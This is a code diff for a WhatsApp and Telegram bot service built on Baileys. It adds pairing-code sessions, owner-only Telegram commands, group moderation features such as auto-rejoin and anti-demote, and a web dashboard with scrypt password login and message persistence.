+
+        // Detect when the bot itself is removed/kicked from a group
+        if (action === "remove" && botJid && participants.includes(botJid)) {
+            const gName = groupNames[groupJid] || groupJid;
+            const savedCode = savedGroupLinks[groupJid];
+
+            // Alert owner on Telegram immediately
+            try {
+                await ctx.reply(
+                    `🚨 *ALERT: Bot was kicked!*\n\n` +
+                    `I was removed from the group:\n*"${gName}"*\n\n` +
+                    `⚠️ Someone may be trying to steal or takeover that group.\n\n` +
+                    `${savedCode ? "🔄 Attempting to auto-rejoin now..." : "❌ No saved invite link — I can't rejoin automatically. Use *.link* in a group next time to enable auto-rejoin."}`
+                );
+            } catch (_) {}
+
+            // Try to auto-rejoin if we have a saved invite link
+            if (savedCode) {
+                try {
+                    await delay(3000);
+                    await sock.groupAcceptInvite(savedCode);
+                    await ctx.reply(`✅ Successfully rejoined *"${gName}"*. I'm back in the group!`);
+                } catch (rejoinErr) {
+                    await ctx.reply(`❌ Auto-rejoin failed for *"${gName}"*: ${rejoinErr?.message || "link may have expired or been changed."}`);
+                }
+            }
+            return;
+        }
+
+        if (action === "add" && getGroupSetting(groupJid, "welcome")) {
+            for (const jid of participants) {
+                const name = `@${jid.split("@")[0]}`;
+                await sock.sendMessage(groupJid, {
+                    text: `🎉 Welcome to the group, ${name}! 👋\n\nWe're glad to have you here. Please read the group rules and enjoy your stay! 🙏`,
+                    mentions: [jid],
+                });
+            }
+        }
+
+        if (action === "remove" && getGroupSetting(groupJid, "goodbye")) {
+            for (const jid of participants) {
+                const name = `@${jid.split("@")[0]}`;
+                await sock.sendMessage(groupJid, {
+                    text: `👋 ${name} has left the group.\n\nSafe travels! 🕊️`,
+                    mentions: [jid],
+                });
+            }
+        }
+
+        if (action === "demote" && getGroupSetting(groupJid, "antidemote")) {
+            const culprit = update.author; // the person who did the demoting
+            for (const jid of participants) {
+                try {
+                    // Immediately demote the person who triggered this
+                    if (culprit && culprit !== jid) {
+                        await sock.groupParticipantsUpdate(groupJid, [culprit], "demote");
+                    }
+                    await sock.sendMessage(groupJid, {
+                        text:
+                            `⚠️ *Anti-Demote Alert!*\n\n` +
+                            `@${culprit ? culprit.split("@")[0] : "Someone"} tried to demote @${jid.split("@")[0]}.\n\n` +
+                            `⚡ *@${culprit ? culprit.split("@")[0] : "The culprit"}* has been demoted immediately as punishment.\n\n` +
+                            `📋 *@${jid.split("@")[0]}* — your case is now with the group owner. Awaiting owner's verdict. 👑`,
+                        mentions: culprit ? [jid, culprit] : [jid],
+                    });
+                } catch (e) {
+                    console.error("Anti-demote error:", e?.message);
+                }
+            }
+        }
+    } catch (err) {
+        console.error("Group update handler error:", err?.message || err);
+    }
+}
+
+// --- TELEGRAM COMMANDS ---
+telBot.start(async (ctx) => {
+    try {
+        if (welcomeConfig.photoFileId) {
+            await ctx.replyWithPhoto(welcomeConfig.photoFileId, {
+                caption: welcomeConfig.text,
+                parse_mode: "Markdown",
+            });
+        } else {
+            await ctx.reply(welcomeConfig.text, { parse_mode: "Markdown" });
+        }
+    } catch (err) {
+        // Fallback if Markdown fails
+        await ctx.reply(welcomeConfig.text).catch(() => {});
+    }
+});
+
+// --- OWNER-ONLY: Set welcome message text ---
+telBot.command("setwelcome", async (ctx) => {
+    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
+    const newText = ctx.message.text.replace(/^\/setwelcome\s*/i, "").trim();
+    if (!newText) return ctx.reply(
+        "Usage: /setwelcome Your custom welcome message here\n\n" +
+        "You can use Telegram markdown:\n" +
+        "  *bold*  _italic_  `code`\n\n" +
+        "Example:\n/setwelcome Welcome to *My Bot!* 🎉\n\nSend /pair to link WhatsApp."
+    );
+    welcomeConfig.text = newText;
+    saveWelcomeConfig();
+    await ctx.reply("✅ Welcome message updated! Use /previewwelcome to see how it looks.");
+});
+
+// --- OWNER-ONLY: Set welcome photo (reply to a photo with this command) ---
+telBot.command("setwelcomepic", async (ctx) => {
+    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
+    const photo = ctx.message?.reply_to_message?.photo;
+    if (!photo || !photo.length) return ctx.reply(
+        "📸 How to set a welcome photo:\n\n" +
+        "1. Send the photo you want to use\n" +
+        "2. Then *reply to that photo* with /setwelcomepic\n\n" +
+        "_The photo will show whenever a user types /start_",
+        { parse_mode: "Markdown" }
+    );
+    // Use the highest-resolution version of the photo
+    const fileId = photo[photo.length - 1].file_id;
+    welcomeConfig.photoFileId = fileId;
+    saveWelcomeConfig();
+    await ctx.reply("✅ Welcome photo set! Use /previewwelcome to see the full welcome.");
+});
+
+// --- OWNER-ONLY: Remove welcome photo ---
+telBot.command("clearwelcomepic", async (ctx) => {
+    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
+    welcomeConfig.photoFileId = null;
+    saveWelcomeConfig();
+    await ctx.reply("✅ Welcome photo removed. /start will now show text only.");
+});
+
+// --- OWNER-ONLY: Preview what users will see ---
+telBot.command("previewwelcome", async (ctx) => {
+    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
+    await ctx.reply("👁 Here's what users will see when they type /start:\n─────────────────");
+    try {
+        if (welcomeConfig.photoFileId) {
+            await ctx.replyWithPhoto(welcomeConfig.photoFileId, {
+                caption: welcomeConfig.text,
+                parse_mode: "Markdown",
+            });
+        } else {
+            await ctx.reply(welcomeConfig.text, { parse_mode: "Markdown" });
+        }
+    } catch (err) {
+        await ctx.reply(welcomeConfig.text).catch(() => {});
+    }
+    await ctx.reply(
+        "─────────────────\n" +
+        "Owner commands:\n" +
+        "• /setwelcome <text> — change the welcome text\n" +
+        "• /setwelcomepic — reply to a photo to set welcome image\n" +
+        "• /clearwelcomepic — remove the welcome photo\n" +
+        "• /previewwelcome — see this preview again\n" +
+        "• /addowner <telegram_id> — grant owner access to someone\n" +
+        "• /removeowner <telegram_id> — revoke their owner access\n" +
+        "• /listowners — see all current owners"
+    );
+});
+
+// --- OWNER-ONLY: Add another owner (primary owner only) ---
+telBot.command("addowner", async (ctx) => {
+    if (!isPrimaryOwner(ctx)) return ctx.reply("⛔ Only the primary owner can add new owners.");
+    const newId = ctx.message.text.replace(/^\/addowner\s*/i, "").trim();
+    if (!newId || !/^\d+$/.test(newId)) return ctx.reply(
+        "Usage: /addowner <telegram_id>\n\n" +
+        "Example: /addowner 123456789\n\n" +
+        "To get someone's Telegram ID, ask them to message @userinfobot on Telegram."
+    );
+    if (newId === PRIMARY_OWNER_ID) return ctx.reply("That's already you — the primary owner! 😄");
+    if (welcomeConfig.extraOwners.includes(newId)) return ctx.reply(`⚠️ ID ${newId} is already an owner.`);
+    welcomeConfig.extraOwners.push(newId);
+    saveWelcomeConfig();
+    await ctx.reply(`✅ Done! ID *${newId}* has been added as an owner.\n\nThey can now use all owner commands.`, { parse_mode: "Markdown" });
+});
+
+// --- OWNER-ONLY: Remove an owner (primary owner only) ---
+telBot.command("removeowner", async (ctx) => {
+    if (!isPrimaryOwner(ctx)) return ctx.reply("⛔ Only the primary owner can remove owners.");
+    const targetId = ctx.message.text.replace(/^\/removeowner\s*/i, "").trim();
+    if (!targetId || !/^\d+$/.test(targetId)) return ctx.reply("Usage: /removeowner <telegram_id>\n\nExample: /removeowner 123456789");
+    if (targetId === PRIMARY_OWNER_ID) return ctx.reply("❌ You can't remove yourself as the primary owner.");
+    if (!welcomeConfig.extraOwners.includes(targetId)) return ctx.reply(`⚠️ ID ${targetId} is not in the owners list.`);
+    welcomeConfig.extraOwners = welcomeConfig.extraOwners.filter(id => id !== targetId);
+    saveWelcomeConfig();
+    await ctx.reply(`✅ ID *${targetId}* has been removed from owners.`, { parse_mode: "Markdown" });
+});
+
+// --- OWNER-ONLY: List all owners ---
+telBot.command("listowners", async (ctx) => {
+    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
+    const lines = [`👑 *Primary Owner (you):* ${PRIMARY_OWNER_ID}`];
+    if (welcomeConfig.extraOwners.length === 0) {
+        lines.push("\n_No extra owners added yet._");
+    } else {
+        lines.push("\n👥 *Extra Owners:*");
+        welcomeConfig.extraOwners.forEach((id, i) => lines.push(`${i + 1}. ${id}`));
+    }
+    lines.push("\n\nUse /addowner <id> or /removeowner <id> to manage.");
+    await ctx.reply(lines.join("\n"), { parse_mode: "Markdown" });
+});
+
+telBot.command("pair", async (ctx) => {
+    const userId = ctx.from.id;
+    const input = ctx.message.text.split(" ")[1];
+    if (!input) return ctx.reply("Abeg, add your number! Example: /pair 2348102756072");
+
+    if (activeSockets[userId]) {
+        try { activeSockets[userId].end(); } catch (_) {}
+        delete activeSockets[userId];
+    }
+
+    retryCounts[userId] = 0;
+    clearAuthState(userId);
+
+    ctx.reply("🔄 Generating your pairing code... please wait a few seconds.");
+    startBot(userId, input.trim(), ctx);
+});
+
+// Kill any existing polling session (prevents 409 Conflict on restart)
+(function killExistingSession(cb) {
+    const killUrl = `/bot${TELEGRAM_TOKEN}/deleteWebhook?drop_pending_updates=true`;
+    const req = https.request({ hostname: "api.telegram.org", path: killUrl, method: "GET" }, () => { setTimeout(cb, 1500); });
+    req.on("error", () => setTimeout(cb, 1500));
+    req.end();
+})(() => {
+    try { rearmAllReminders(); rearmAllTimers(); } catch (e) { console.log(`[boot] rearm err: ${e?.message}`); }
+    try { schedulePromoGroup(); } catch (e) { console.log(`[boot] promo sched err: ${e?.message}`); }
+    try { scheduleThreatReportCycle(); } catch (e) { console.log(`[boot] threat sched err: ${e?.message}`); }
+    if (TELEGRAM_TOKEN) {
+        (function launchTelegram(attempt) {
+            telBot.launch({ dropPendingUpdates: true }).catch(err => {
+                if (err?.message?.includes("409")) {
+                    const wait = Math.min(5000 * attempt, 60000);
+                    console.log(`[Telegram] 409 Conflict — retrying in ${wait / 1000}s... (attempt ${attempt})`);
+                    setTimeout(() => launchTelegram(attempt + 1), wait);
+                } else {
+                    console.error("[Telegram] Fatal launch error:", err?.message || err);
+                }
+            });
+        })(1);
+    } else {
+        console.log("[Telegram] Skipping launch — no TELEGRAM_TOKEN set (web-only mode).");
+    }
+});
+
+process.once("SIGINT", () => { if (TELEGRAM_TOKEN) telBot.stop("SIGINT"); process.exit(0); });
+process.once("SIGTERM", () => { if (TELEGRAM_TOKEN) telBot.stop("SIGTERM"); });
+
+// --- WEB PAIRING SESSION TRACKER ---
+// Tracks in-progress web pairing requests: sessionId -> { status, code }
+const webSessions = new Map();
+
+// --- SSE REAL-TIME PUSH ---
+// Maps userId -> Set of active SSE response objects
+const sseClients = new Map();
+
+function pushToSSE(userId, payload) {
+    const clients = sseClients.get(userId);
+    if (!clients || clients.size === 0) return;
+    const data = `data: ${JSON.stringify(payload)}\n\n`;
+    for (const res of [...clients]) {
+        try { res.write(data); } catch (_) { clients.delete(res); }
+    }
+}
+
+function extractMsgText(msg) {
+    const m = unwrapMessageContent(msg.message || {}) || {};
+    return m.conversation
+        || m.extendedTextMessage?.text
+        || m.imageMessage?.caption
+        || m.videoMessage?.caption
+        || m.documentMessage?.caption
+        || (m.stickerMessage  ? "[Sticker]" : null)
+        || (m.audioMessage    ? "[Voice message]" : null)
+        || (m.videoMessage && !m.videoMessage.caption ? "[Video]" : null)
+        || m.contactMessage?.displayName
+        || m.locationMessage?.name
+        || null;
+}
+
+function buildSSEMessage(msg) {
+    const text = extractMsgText(msg);
+    if (!text) return null;
+    const jid       = msg.key.remoteJid;
+    const fromMe    = msg.key.fromMe;
+    const participant = msg.key.participant || null;
+    const sender    = participant || (fromMe ? null : jid);
+    const senderNum = sender ? sender.split("@")[0].split(":")[0] : null;
+    // Get contact name from pushName or notifyName
+    const msgContent = msg.message || {};
+    let pushName = null;
+    // Try to get the sender's name from various sources
+    if (msg.pushName) pushName = msg.pushName;
+    else if (msg.notifyName) pushName = msg.notifyName;
+    // For group messages, participant info may have name
+    else if (msg.key.participant && msg.participant) pushName = msg.participant;
+    // Fallback: use the number formatted nicely
+    const displayName = pushName || (senderNum ? "+" + senderNum : (fromMe ? "You" : "Unknown"));
+    return {
+        event:       "message",
+        jid,
+        msgId:       msg.key.id,
+        fromMe,
+        sender,
+        senderName:  displayName,
+        senderNum:   senderNum || null,
+        pushName:    pushName || null,
+        text,
+        timestamp:   ((msg.messageTimestamp || 0) * 1000) || Date.now(),
+        isGroup:     jid ? jid.endsWith("@g.us") : false,
+        groupName:   null, // will be resolved on frontend if needed
+        key: {
+            remoteJid:   jid,
+            id:          msg.key.id,
+            fromMe,
+            participant: participant || undefined,
+        },
+    };
+}
+
+// --- WEB SESSION TOKENS ---
+// Maps dashboard token -> { userId, phone, jid, created }
+// Persisted to web_sessions_tokens.json so tokens survive restarts.
+const WEB_TOKEN_FILE = dataPath("web_sessions_tokens.json");
+let webTokens = {}; // token -> { userId, phone }
+
+function loadWebTokens() {
+    try {
+        if (fs.existsSync(WEB_TOKEN_FILE)) {
+            webTokens = JSON.parse(fs.readFileSync(WEB_TOKEN_FILE, "utf8"));
+        }
+    } catch (_) { webTokens = {}; }
+}
+function saveWebTokens() {
+    try {
+        fs.writeFileSync(WEB_TOKEN_FILE, JSON.stringify(webTokens, null, 2));
+        if (typeof githubSync !== "undefined") githubSync.triggerSync(true);
+    } catch (_) {}
+}
+function generateWebToken() {
+    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+    let token = "EO-";
+    for (let i = 0; i < 16; i++) token += chars[Math.floor(Math.random() * chars.length)];
+    return token;
+}
+loadWebTokens();
+
+// ─── REAL BACKEND AUTH (signup/login/logout/me) ──────────────────────────────
+// Replaces the previous client-side localStorage "auth" with a real users.json
+// + scrypt password hashing + signed HttpOnly cookie sessions. The session ID
+// system (EO-XXXX) for controlling bots is SEPARATE — accounts here are just
+// for who can access the dashboard at all.
+const WEB_USERS_FILE    = dataPath("web_users.json");
+const WEB_USESS_FILE    = dataPath("web_user_sessions.json");
+let webUsers     = {};   // emailLowercase -> { name, email, hash, salt, created }
+let webUserSess  = {};   // sessionToken   -> { email, created, lastSeen }
+
+function loadWebUsers() {
+    try { if (fs.existsSync(WEB_USERS_FILE))  webUsers    = JSON.parse(fs.readFileSync(WEB_USERS_FILE,    "utf8")); } catch (_) { webUsers = {}; }
+    try { if (fs.existsSync(WEB_USESS_FILE))  webUserSess = JSON.parse(fs.readFileSync(WEB_USESS_FILE,   "utf8")); } catch (_) { webUserSess = {}; }
+}
+function saveWebUsers()    { try { fs.writeFileSync(WEB_USERS_FILE,  JSON.stringify(webUsers,    null, 2)); if (typeof githubSync !== "undefined") githubSync.triggerSync(true); } catch (_) {} }
+function saveWebUserSess() { try { fs.writeFileSync(WEB_USESS_FILE, JSON.stringify(webUserSess, null, 2)); if (typeof githubSync !== "undefined") githubSync.triggerSync(true); } catch (_) {} }
+
+function hashPassword(password, salt = null) {
+    if (!salt) salt = crypto.randomBytes(16).toString("hex");
+    const hash = crypto.scryptSync(password, salt, 64).toString("hex");
+    return { hash, salt };
+}
+function verifyPassword(password, salt, expectedHash) {
+    const { hash } = hashPassword(password, salt);
+    return crypto.timingSafeEqual(Buffer.from(hash, "hex"), Buffer.from(expectedHash, "hex"));
+}
+function newSessionToken() { return crypto.randomBytes(32).toString("hex"); }
+
+// Cookie helpers
+function parseCookies(req) {
+    const out = {};
+    const raw = req.headers.cookie || "";
+    raw.split(";").forEach(c => {
+        const i = c.indexOf("=");
+        if (i > 0) out[c.slice(0, i).trim()] = decodeURIComponent(c.slice(i + 1).trim());
+    });
+    return out;
+}
+function setSessionCookie(res, token) {
+    // 30-day persistent HttpOnly cookie; SameSite=Lax so it survives normal navigation.
+    const maxAge = 60 * 60 * 24 * 30;
+    res.setHeader("Set-Cookie", `eo_auth=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${maxAge}`);
+}
+function clearSessionCookie(res) {
+    res.setHeader("Set-Cookie", `eo_auth=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`);
+}
+function getAuthedUser(req) {
+    const cookies = parseCookies(req);
+    const tok = cookies.eo_auth;
+    if (!tok) return null;
+    const sess = webUserSess[tok];
+    if (!sess) return null;
+    sess.lastSeen = Date.now();
+    return webUsers[sess.email] || null;
+}
+
+loadWebUsers();
+
+// ─── ACTIVITY LOG ────────────────────────────────────────────────────────────
+// Per-session ring buffer of recent actions (commands run, dashboard actions,
+// connect/disconnect events) so the dashboard can show a live activity feed.
+const activityLogs       = new Map();   // userId -> [{ ts, type, text }]
+const recentPrivateChats = new Map();   // userId -> Map(jid -> { jid, lastSeen })
+
+// ─── MESSAGE PERSISTENCE ───────────────────────────────────────────────────────
+// Persists messages per userId + chat JID so they survive dashboard refresh.
+// Format: { userId: { chatJid: [ msg1, msg2, ... ] } }
+// Capped at 100 messages per chat.
+const WEB_MSGS_FILE = dataPath("web_messages.json");
+const CONTACT_NAMES_FILE = dataPath("web_contact_names.json");
+let webMessages = {};    // userId -> { jid -> [msg] }
+let contactNames = {};   // userId -> { jid -> name }
+
+function loadWebMessages() {
+    try { if (fs.existsSync(WEB_MSGS_FILE)) webMessages = JSON.parse(fs.readFileSync(WEB_MSGS_FILE, "utf8")); } catch (_) { webMessages = {}; }
+}
+function saveWebMessages() {
+    try { fs.writeFileSync(WEB_MSGS_FILE, JSON.stringify(webMessages, null, 0)); } catch (_) {}
+}
+function loadContactNames() {
+    try { if (fs.existsSync(CONTACT_NAMES_FILE)) contactNames = JSON.parse(fs.readFileSync(CONTACT_NAMES_FILE, "utf8")); } catch (_) { contactNames = {}; }
+}
+function saveContactNames() {
+    try { fs.writeFileSync(CONTACT_NAMES_FILE, JSON.stringify(contactNames, null, 0)); } catch (_) {}
+}
+loadWebMessages();
+loadContactNames();
+
+function persistMessage(userId, msgData) {
+    if (!userId || !msgData || !msgData.jid) return;
+    if (!webMessages[userId]) webMessages[userId] = {};
+    const chatJid = msgData.jid;
+    if (!webMessages[userId][chatJid]) webMessages[userId][chatJid] = [];
+    webMessages[userId][chatJid].push(msgData);
+    // Cap at 100 messages per chat
+    if (webMessages[userId][chatJid].length > 100) {
+        webMessages[userId][chatJid] = webMessages[userId][chatJid].slice(-100);
+    }
+    saveWebMessages();
+}
+
+function persistContactName(userId, jid, name) {
+    if (!userId || !jid || !name) return;
+    if (!contactNames[userId]) contactNames[userId] = {};
+    // Only update if name is better (has actual text, not just a number)
+    const existing = contactNames[userId][jid];
+    if (!existing || (name.length > existing.length && !name.startsWith("+"))) {
+        contactNames[userId][jid] = name;
+        saveContactNames();
+    }
+}
+
+function getPersistedMessages(userId, jid) {
+    if (!webMessages[userId] || !webMessages[userId][jid]) return [];
+    return webMessages[userId][jid];
+}
+
+function getPersistedChats(userId) {
+    if (!webMessages[userId]) return {};
+    const result = {};
+    for (const [jid, msgs] of Object.entries(webMessages[userId])) {
+        if (msgs.length > 0) {
+            const last = msgs[msgs.length - 1];
+            result[jid] = {
+                jid,
+                name: contactNames[userId]?.[jid] || (jid.endsWith("@g.us") ? "Group" : "+" + jid.split("@")[0]),
+                isGroup: jid.endsWith("@g.us"),
+                lastMsg: last.text,
+                lastTime: last.timestamp,
+                count: msgs.length,
+            };
+        }
+    }
+    return result;
+}
+const ACTIVITY_MAX = 200;
+function logActivity(userId, type, text) {
+    if (!userId) return;
+    if (!activityLogs.has(userId)) activityLogs.set(userId, []);
+    const arr = activityLogs.get(userId);
+    arr.push({ ts: Date.now(), type, text: String(text || "").slice(0, 300) });
+    if (arr.length > ACTIVITY_MAX) arr.splice(0, arr.length - ACTIVITY_MAX);
+    // Also push to SSE clients in real-time
+    pushToSSE(userId, { event: "activity", type, text: String(text || "").slice(0, 300), ts: Date.now() });
+}
+
+// ─── BOT PAUSE STATE ─────────────────────────────────────────────────────────
+// Per-userId boolean — when paused, the bot ignores all WhatsApp messages
+// (except the .resume command from the owner) until resumed via dashboard.
+const botPaused = new Set();   // set of userIds currently paused
+function isBotPaused(userId) { return botPaused.has(userId); }
+
+
+// Returns true only if the socket's WebSocket is OPEN and the bot is signed in.
+// `sock.user.id` alone is stale after a silent disconnect.
+function isSocketLive(sock) {
+    if (!sock || !sock.user?.id) return false;
+    const ws = sock.ws;
+    if (!ws) return false;
+    // Baileys uses a raw WebSocket. readyState 1 === OPEN
+    if (typeof ws.readyState === "number" && ws.readyState !== 1) return false;
+    if (ws.isClosed === true || ws.closed === true) return false;
+    return true;
+}
+
+function startPresenceHeartbeat(userId, sock) {
+    stopPresenceHeartbeat(userId);
+    presenceHeartbeats[userId] = setInterval(async () => {
+        try {
+            if (!isSocketLive(sock)) return;
+            await sock.sendPresenceUpdate("available");
+        } catch (_) {}
+    }, 45000);
+    presenceHeartbeats[userId].unref?.();
+}
+
+function stopPresenceHeartbeat(userId) {
+    const t = presenceHeartbeats[userId];
+    if (t) clearInterval(t);
+    delete presenceHeartbeats[userId];
+}
+
+function clearWebReconnectTimer(sessionId) {
+    const t = webReconnectTimers[sessionId];
+    if (t) clearTimeout(t);
+    delete webReconnectTimers[sessionId];
+}
+
+function scheduleWebReconnect(sessionId, phoneNumber, delayMs, why = 'unknown') {
+    clearWebReconnectTimer(sessionId);
+    console.log(`[WebReconnect] scheduling reconnect for ${sessionId} in ${Math.round(delayMs/1000)}s (${why})`);
+    webReconnectTimers[sessionId] = setTimeout(() => {
+        clearWebReconnectTimer(sessionId);
+        startBotForWeb(sessionId, phoneNumber).catch((e) => {
+            console.error(`[WebReconnect] failed for ${sessionId}:`, e?.message || e);
+        });
+    }, delayMs);
+    webReconnectTimers[sessionId].unref?.();
+}
+
+function shouldSyncHistoryMessageMinimal({ syncType } = {}) {
+    // FULL history sync is type=2 upstream; allow everything else so Baileys can
+    // receive essential LID mappings, device-list data and group participation state.
+    return Number(syncType) !== 2;
+}
+
+function cacheGroupMetadata(meta) {
+    if (!meta?.id) return;
+    groupMetadataCache.set(meta.id, { meta, ts: Date.now() });
+}
+
+async function ensureGroupReady(sock, jid, label = 'sock') {
+    if (!String(jid || '').endsWith('@g.us')) return null;
+    const cached = groupMetadataCache.get(jid);
+    const freshMs = 5 * 60 * 1000;
+    if (cached && (Date.now() - cached.ts) < freshMs) return cached.meta;
+    try {
+        const meta = await sock.groupMetadata(jid);
+        if (meta) cacheGroupMetadata(meta);
+        debugLog(`[GroupWarm] refreshed metadata for ${jid} via ${label}`);
+        return meta || null;
+    } catch (e) {
+        console.error(`[GroupWarm] groupMetadata failed for ${jid} via ${label}:`, e?.message || e);
+        return cached?.meta || null;
+    }
+}
+
+async function warmAllGroups(sock, label = 'sock') {
+    try {
+        if (typeof sock.groupFetchAllParticipating !== 'function') return 0;
+        const groups = await sock.groupFetchAllParticipating();
+        let count = 0;
+        for (const meta of Object.values(groups || {})) {
+            cacheGroupMetadata(meta);
+            count++;
+        }
+        console.log(`[GroupWarm] cached ${count} group(s) for ${label}`);
+        return count;
+    } catch (e) {
+        console.error(`[GroupWarm] groupFetchAllParticipating failed for ${label}:`, e?.message || e);
+        return 0;
+    }
+}
+
+function attachGroupCacheHooks(sock, label = 'sock') {
+    if (!sock || sock.__groupCacheHooksInstalled) return;
+    sock.ev.on('groups.upsert', (groups = []) => {
+        for (const meta of groups) cacheGroupMetadata(meta);
+        if (groups.length) debugLog(`[GroupWarm] groups.upsert cached ${groups.length} group(s) for ${label}`);
+    });
+    sock.ev.on('groups.update', async (updates = []) => {
+        for (const update of updates) {
+            const jid = update?.id;
+            if (!jid) continue;
+            try {
+                const meta = await sock.groupMetadata(jid);
+                if (meta) cacheGroupMetadata(meta);
+            } catch (_) {}
+        }
+        if (updates.length) debugLog(`[GroupWarm] groups.update refreshed ${updates.length} group(s) for ${label}`);
+    });
+    sock.ev.on('group-participants.update', async (ev) => {
+        try {
+            if (ev?.id) {
+                const meta = await sock.groupMetadata(ev.id);
+                if (meta) cacheGroupMetadata(meta);
+            }
+        } catch (_) {}
+    });
+    sock.__groupCacheHooksInstalled = true;
+}
+
+function installQuotedGroupFallback(sock, label = 'sock') {
+    if (!sock || sock.__quotedFallbackInstalled) return;
+    const originalSendMessage = sock.sendMessage.bind(sock);
+    sock.__originalSendMessage = originalSendMessage;
+    sock.sendMessage = async (jid, content, options = {}, ...rest) => {
+        const isGroupJid = String(jid || '').endsWith('@g.us');
+        let sendOptions = options || {};
+
+        // Group replies have proven unreliable when quoted (especially with @lid-origin
+        // messages). So for groups we strip quoted context BEFORE the first send attempt.
+        if (isGroupJid && sendOptions?.quoted) {
+            sendOptions = { ...sendOptions };
+            delete sendOptions.quoted;
+            if (GROUP_TRACE || DEBUG_RUNTIME) {
+                try {
+                    const selfNum = (sock.user?.id || '').split(':')[0].split('@')[0];
+                    if (selfNum) {
+                        await originalSendMessage(selfNum + '@s.whatsapp.net', {
+                            text: `🛠️ *Group send mode*
+chat: ${jid}
+where: ${label}
+action: stripped quoted reply before send`
+                        });
+                    }
+                } catch (_) {}
+            }
+        }
+
+        try {
+            if (isGroupJid) await ensureGroupReady(sock, jid, label);
+            return await originalSendMessage(jid, content, sendOptions, ...rest);
+        } catch (err) {
+            const msg = String(err?.message || err || 'unknown send error');
+            if (!isGroupJid) throw err;
+
+            // One retry for group send timeouts — these are the main failure mode seen in traces.
+            if (/timed?\s*out|timeout/i.test(msg)) {
+                console.error(`[GroupSendRetry:${label}] timeout in ${jid}: ${msg}`);
+                try {
+                    await delay(1500);
+                    await ensureGroupReady(sock, jid, label);
+                    return await originalSendMessage(jid, content, sendOptions, ...rest);
+                } catch (retryErr) {
+                    const retryMsg = String(retryErr?.message || retryErr || 'unknown retry send error');
+                    console.error(`[GroupSendRetry:${label}] retry failed in ${jid}: ${retryMsg}`);
+                    if (GROUP_TRACE || DEBUG_RUNTIME) {
+                        try {
+                            const selfNum = (sock.user?.id || '').split(':')[0].split('@')[0];
+                            if (selfNum) {
+                                await originalSendMessage(selfNum + '@s.whatsapp.net', {
+                                    text: `❌ *Group send retry failed*
+chat: ${jid}
+where: ${label}
+first: ${msg.slice(0, 700)}
+retry: ${retryMsg.slice(0, 700)}`
+                                });
+                            }
+                        } catch (_) {}
+                    }
+                    throw retryErr;
+                }
+            }
+
+            console.error(`[GroupSend:${label}] group send failed in ${jid}: ${msg}`);
+            if (GROUP_TRACE || DEBUG_RUNTIME) {
+                try {
+                    const selfNum = (sock.user?.id || '').split(':')[0].split('@')[0];
+                    if (selfNum) {
+                        await originalSendMessage(selfNum + '@s.whatsapp.net', {
+                            text: `⚠️ *Group send failed*
+chat: ${jid}
+where: ${label}
+reason: ${msg.slice(0, 700)}`
+                        });
+                    }
+                } catch (_) {}
+            }
+            throw err;
+        }
+    };
+    sock.__quotedFallbackInstalled = true;
+}
+
+// Tear down a dead/stale web pairing session so a fresh /api/pair can re-pair cleanly.
+async function tearDownWebSession(sessionId, { wipeAuth = false } = {}) {
+    clearWebReconnectTimer(sessionId);
+    stopPresenceHeartbeat(sessionId);
+    const sock = activeSockets[sessionId];
+    if (sock) {
+        try { sock.ev?.removeAllListeners?.(); } catch (_) {}
+        try { sock.end?.(new Error("tear-down")); } catch (_) {}
+        try { sock.ws?.close?.(); } catch (_) {}
+    }
+    delete activeSockets[sessionId];
+    webSessions.delete(sessionId);
+    retryCounts[sessionId] = 0;
+    if (wipeAuth) {
+        try { clearAuthState(sessionId); } catch (_) {}
+    }
+}
+
+// Start a bot session initiated from the web pairing page.
+// Returns the pairing code string, or throws on failure.
+async function startBotForWeb(sessionId, phoneNumber) {
+    if (isSocketLive(activeSockets[sessionId])) {
+        debugLog(`[WebStart] ${sessionId} already live — skipping duplicate start`);
+        return webSessions.get(sessionId)?.code || null;
+    }
+    if (webSessionStartPromises.has(sessionId)) {
+        debugLog(`[WebStart] ${sessionId} start already in progress — reusing promise`);
+        return webSessionStartPromises.get(sessionId);
+    }
+
+    const launch = (async () => {
+    const { state, saveCreds } = await useMultiFileAuthState(getAuthDir(sessionId));
+    const { version } = await fetchLatestBaileysVersion();
+    const socketMsgStore = createMessageStore();
+
+    const sock = makeWASocket({
+        version,
+        browser: [ "Ubuntu", "Chrome", "20.0.04" ],
+        auth: {
+            creds: state.creds,
+            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
+        },
+        printQRInTerminal: false,
+        logger: pino({ level: "fatal" }),
+        markOnlineOnConnect: true,
+        syncFullHistory: false,
+        shouldSyncHistoryMessage: shouldSyncHistoryMessageMinimal,
+        cachedGroupMetadata: async (jid) => groupMetadataCache.get(jid)?.meta,
+        patchMessageBeforeSending: patchLegacyInteractiveForWhiskey,
+        generateHighQualityLinkPreview: false,
+        getMessage: async (key) => socketMsgStore.get(key),
+        browser: [ "Ubuntu", "Chrome", "20.0.04" ],
+        browser: [ "Ubuntu", "Chrome", "20.0.04" ],
+        keepAliveIntervalMs: 15_000,
+        connectTimeoutMs: 90_000,
+        retryRequestDelayMs: 500,
+    });
+
+    activeSockets[sessionId] = sock;
+    installQuotedGroupFallback(sock, `web:${sessionId}`);
+    attachGroupCacheHooks(sock, `web:${sessionId}`);
+    webSessions.set(sessionId, { status: "waiting", code: null });
+
+    let pairingCode = null;
+    if (!sock.authState.creds.registered) {
+        await delay(3000);
+        try {
+            pairingCode = await sock.requestPairingCode(phoneNumber.trim());
+            webSessions.get(sessionId).code = pairingCode;
+        } catch (err) {
+            console.error(`[Web/pair] requestPairingCode failed for ${sessionId}:`, err?.message);
+            // Mark this session as failed and tear it down so the next /api/pair retries cleanly
+            const sx = webSessions.get(sessionId);
+            if (sx) sx.status = "failed";
+            try { sock.ev?.removeAllListeners?.(); } catch (_) {}
+            try { sock.end?.(err); } catch (_) {}
+            try { sock.ws?.close?.(); } catch (_) {}
+            delete activeSockets[sessionId];
+            throw err;
+        }
+    }
+
+    sock.ev.on("creds.update", async () => {
+        await saveCreds();
+        githubSync.triggerSync(false); // 5 minute background debounce
+    });
+
